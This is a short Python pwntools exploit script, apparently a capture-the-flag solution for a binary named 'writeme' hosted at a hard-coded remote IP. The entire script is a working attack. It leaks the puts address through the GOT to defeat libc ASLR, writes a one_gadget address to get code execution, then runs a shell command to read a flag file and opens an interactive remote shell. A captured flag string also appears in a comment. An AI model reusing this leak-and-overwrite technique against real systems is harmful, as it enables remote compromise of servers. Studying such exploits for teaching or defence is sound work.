#!/usr/bin/env python
from pwn import *

# FLAG{y33SuTd5GsmOPwonYWqePbS3y3R9Tz33}

e , l = ELF( './writeme' ) , ELF( './libc.so' )

host , port = '35.194.194.168' , 6666
y = remote( host , port )

y.sendlineafter( ':' , str( e.got['puts'] ) )

y.recvuntil( '=0x' )
l.address += int( y.recvline().strip() , 16 ) - l.symbols['puts']
print 'libc -> %s' % hex( l.address )


one = 0xf1117

y.sendlineafter( ':' , str( l.address + one ) )

sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()